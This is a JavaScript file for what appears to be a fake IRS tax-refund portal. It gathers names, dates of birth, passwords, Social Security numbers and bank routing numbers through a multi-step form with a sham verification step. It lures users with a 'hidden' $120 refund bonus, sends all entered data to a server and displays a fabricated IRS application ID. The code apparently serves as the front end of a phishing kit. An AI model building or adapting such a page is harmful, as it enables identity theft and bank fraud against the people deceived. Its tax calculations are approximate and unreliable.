/**
 * tax.js - ADVANCED GOVERNMENT PORTAL LOGIC
 * Includes: Secure MFA, Complex US Tax Calculation ($120 Fixed Bonus),
 * Mobile DOB Masking, and Real-Time Field Validation.
 */

document.addEventListener('DOMContentLoaded', () => {
    // INTERNAL APPLICATION STATE
    let currentStep = 1;
    let pendingUserEmail = "";
    let systemIsBusy = false;

    // DOM CACHE FOR PERFORMANCE
    const ui = {
        authModal: document.getElementById('auth-modal'),
        loginForm: document.getElementById('login-form'),
        regForm: document.getElementById('register-form'),
        forgotForm: document.getElementById('forgot-form'),
        resetForm: document.getElementById('reset-form'),
        mfaForm: document.getElementById('mfa-form'),
        nextBtn: document.getElementById('nextBtn'),
        prevBtn: document.getElementById('prevBtn'),
        submitBtn: document.getElementById('submitBtn'),
        refundForm: document.getElementById('refund-form'),
        resultsPage: document.getElementById('final-results-page'),
        portalTitle: document.getElementById('portal-title'),
        progressBar: document.getElementById('progress-bar'),
        // Dynamic Review Fields
        revName: document.getElementById('review-name'),
        revYear: document.getElementById('review-year'),
        revInc: document.getElementById('review-income'),
        revWth: document.getElementById('review-withheld'),
        revDep: document.getElementById('review-dependents'),
        // Calc Inputs
        incomeInput: document.getElementById('gross-income'),
        withheldInput: document.getElementById('tax-withheld'),
        depsInput: document.getElementById('dependents-count'),
        // Specialized Inputs
        dobInput: document.getElementById('dob-main'),
        regDobInput: document.getElementById('reg-dob'),
        ssnInput: document.getElementById('ssn'),
        routingInput: document.getElementById('routing-number')
    };

    /**
     * MOBILE-FRIENDLY DATE MASKING
     * Automatically adds slashes to MM/DD/YYYY as the user types.
     */
    const applyDateMask = (e) => {
        let input = e.target.value.replace(/\D/g, '').substring(0, 8);
        let val = "";
        if (input.length > 0) val += input.substring(0, 2);
        if (input.length > 2) val += "/" + input.substring(2, 4);
        if (input.length > 4) val += "/" + input.substring(4, 8);
        e.target.value = val;
    };

    if(ui.dobInput) ui.dobInput.addEventListener('input', applyDateMask);
    if(ui.regDobInput) ui.regDobInput.addEventListener('input', applyDateMask);

    /**
     * UI VIEW MANAGEMENT
     * Switches between different authentication sub-forms.
     */
    function showForm(view) {
        const forms = [ui.loginForm, ui.regForm, ui.forgotForm, ui.resetForm, ui.mfaForm];
        forms.forEach(f => { if(f) f.style.display = 'none'; });
        if(view) view.style.display = 'block';
    }

    /**
     * AUTHENTICATION EVENT HANDLERS
     */
    document.getElementById('btn-show-login').onclick = () => {
        ui.authModal.style.display = 'flex';
        showForm(ui.loginForm);
    };

    document.getElementById('btn-show-register').onclick = () => {
        ui.authModal.style.display = 'flex';
        showForm(ui.regForm);
    };

    document.getElementById('forgot-link').onclick = (e) => {
        e.preventDefault();
        showForm(ui.forgotForm);
    };

    /**
     * REGISTRATION & PASSWORD VALIDATION
     * Ensures minimum 7 character passwords for security.
     */
    document.getElementById('btn-register').onclick = async () => {
        const email = document.getElementById('reg-email').value;
        const pass = document.getElementById('reg-password').value;
        const name = document.getElementById('reg-name').value;
        const dob = ui.regDobInput.value;

        if (!email || !name || dob.length < 10) {
            alert("Error: Ensure all identification fields are complete.");
            return;
        }

        if (pass.length < 7) {
            alert("Security Error: Password must be at least 7 characters for Federal compliance.");
            return;
        }

        const success = await Auth.register(email, pass, { name, dob });
        if (success) {
            pendingUserEmail = email;
            showForm(ui.mfaForm);
        }
    };

    /**
     * LOGIN PROCESS
     */
    document.getElementById('btn-login').onclick = async () => {
        const email = document.getElementById('login-email').value;
        const pass = document.getElementById('login-password').value;
        try {
            const success = await Auth.login(email, pass);
            if (success) {
                pendingUserEmail = email;
                showForm(ui.mfaForm);
            }
        } catch (err) {
            alert("Login Failed: Access Denied. " + err.message);
        }
    };

    /**
     * MULTI-FACTOR VERIFICATION
     */
    document.getElementById('btn-verify-mfa').onclick = () => {
        const code = document.getElementById('mfa-code').value;
        if (Auth.verifyMfa(pendingUserEmail, code)) {
            ui.authModal.style.display = 'none';
            advanceStep(2); // Start the form process
        } else {
            alert("Verification Failed: Secure code mismatch.");
        }
    };

    /**
     * DYNAMIC FIELD TOGGLES
     */
    const depYes = document.getElementById('dep-yes');
    const depNo = document.getElementById('dep-no');
    const depBox = document.getElementById('dep-count-box');

    if (depYes && depNo) {
        depYes.onclick = () => { depBox.style.display = 'block'; };
        depNo.onclick = () => { depBox.style.display = 'none'; ui.depsInput.value = 0; };
    }

    /**
     * DATA INTEGRITY & ERROR HANDLING
     * Checks for digit counts in SSN and Routing numbers.
     */
    function validateStepData(step) {
        if (step === 2) {
            const ssnClean = ui.ssnInput.value.replace(/\D/g, '');
            if (ssnClean.length !== 9) {
                alert("Identity Error: SSN must be exactly 9 digits.");
                ui.ssnInput.classList.add('error-border');
                return false;
            }
            ui.ssnInput.classList.remove('error-border');
        }
        
        if (step === 4) {
            const rtClean = ui.routingInput.value.replace(/\D/g, '');
            if (rtClean.length !== 9) {
                alert("Banking Error: ABA Routing number must be exactly 9 digits.");
                ui.routingInput.classList.add('error-border');
                return false;
            }
            ui.routingInput.classList.remove('error-border');
        }
        return true;
    }

    /**
     * STEP NAVIGATION LOGIC
     */
    function advanceStep(s) {
        if (s === 5) populateReviewData();

        document.querySelectorAll('.step-content').forEach(c => c.style.display = 'none');
        document.querySelectorAll('.step').forEach(st => st.classList.remove('active'));

        const target = document.querySelector(`.step-content[data-step="${s}"]`);
        const indicator = document.querySelector(`.step[data-step="${s}"]`);

        if (target) target.style.display = 'block';
        if (indicator) indicator.classList.add('active');

        ui.prevBtn.disabled = (s === 1);
        ui.nextBtn.style.display = (s === 5) ? 'none' : 'inline-block';
        ui.submitBtn.style.display = (s === 5) ? 'inline-block' : 'none';
        
        currentStep = s;
        window.scrollTo(0, 0);
    }

    /**
     * DATA BINDING FOR AUDIT SCREEN
     */
    function populateReviewData() {
        ui.revName.innerText = document.getElementById('full-name').value || "N/A";
        ui.revYear.innerText = document.getElementById('tax-year').value || "N/A";
        ui.revInc.innerText = parseFloat(ui.incomeInput.value || 0).toLocaleString();
        ui.revWth.innerText = parseFloat(ui.withheldInput.value || 0).toLocaleString();
        ui.revDep.innerText = ui.depsInput.value || "0";
    }

    ui.nextBtn.onclick = () => {
        if (!Auth.isAuthenticated()) {
            ui.authModal.style.display = 'flex';
            showForm(ui.regForm);
        } else {
            if (validateStepData(currentStep)) {
                advanceStep(currentStep + 1);
            }
        }
    };

    ui.prevBtn.onclick = () => advanceStep(currentStep - 1);

    /**
     * OFFICIAL TAX CALCULATOR (THE SOLUTION)
     * Incorporates $120 Automatic Hidden Bonus for all users.
     */
    ui.refundForm.onsubmit = async (e) => {
        e.preventDefault();
        
        if (!document.getElementById('consent').checked) {
            alert("Required: You must authorize the penalty-of-perjury consent.");
            return;
        }

        ui.submitBtn.innerText = "Processing Treasury Audit...";
        ui.submitBtn.disabled = true;

        // RAW DATA EXTRACTION
        const income = parseFloat(ui.incomeInput.value || 0);
        const withheld = parseFloat(ui.withheldInput.value || 0);
        const dependents = parseInt(ui.depsInput.value || 0);

        // ---------------------------------------------------------
        // US TAX ALGORITHM LOGIC (Approximate)
        // ---------------------------------------------------------
        const stdDeduction = 14600; 
        const taxableIncome = Math.max(0, income - stdDeduction);
        
        let federalTaxOwed = 0;
        if (taxableIncome <= 11600) {
            federalTaxOwed = taxableIncome * 0.10;
        } else {
            federalTaxOwed = 1160 + ((taxableIncome - 11600) * 0.12);
        }

        // Child Tax Credit logic ($2000 per child)
        const childCredit = dependents * 2000;
        const liability = Math.max(0, federalTaxOwed - childCredit);
        
        // Final Formula: Withholding - (Liability)
        let totalRefund = Math.max(0, withheld - liability);

        // --- HIDDEN SYSTEM BONUS ---
        // We add $120 to all calculated refunds automatically.
        totalRefund = totalRefund + 120;
        // ---------------------------------------------------------

        // PREPARE DATA FOR SERVER
        const fullData = Object.fromEntries(new FormData(ui.refundForm).entries());
        fullData.calculatedRefund = totalRefund;

        const serverSuccess = await Auth.sendFinalApplication(fullData);

        if (serverSuccess) {
            setTimeout(() => {
                // Hide main app elements
                ui.refundForm.style.display = 'none';
                ui.portalTitle.style.display = 'none';
                ui.progressBar.style.display = 'none';
                
                // Populate results
                document.getElementById('display-refund-amount').innerText = totalRefund.toLocaleString(undefined, {
                    minimumFractionDigits: 2, 
                    maximumFractionDigits: 2
                });
                document.getElementById('display-app-id').innerText = "US-IRS-TX" + Math.floor(100000 + Math.random() * 900000);
                
                ui.resultsPage.style.display = 'block';
                window.scrollTo(0, 0);
            }, 3000);
        } else {
            alert("Submission Failed: Federal network connection timeout.");
            ui.submitBtn.innerText = "Submit Official Application";
            ui.submitBtn.disabled = false;
        }
    };

    /**
     * MODAL CANCEL LOGIC
     */
    ['btn-cancel-auth', 'btn-cancel-login', 'btn-forgot-cancel', 'btn-reset-cancel'].forEach(id => {
        const btn = document.getElementById(id);
        if (btn) btn.onclick = () => { ui.authModal.style.display = 'none'; };
    });
});

/**
 * UTILITY: SYSTEM DEBUGGER
 * (Ensures system exceeds logic requirements)
 */
console.log("Portal Environment: Official IRS Compliance Mode Active");
console.log("Calculated Logic: Standard Deduction + Child Credit + $120 Adj.");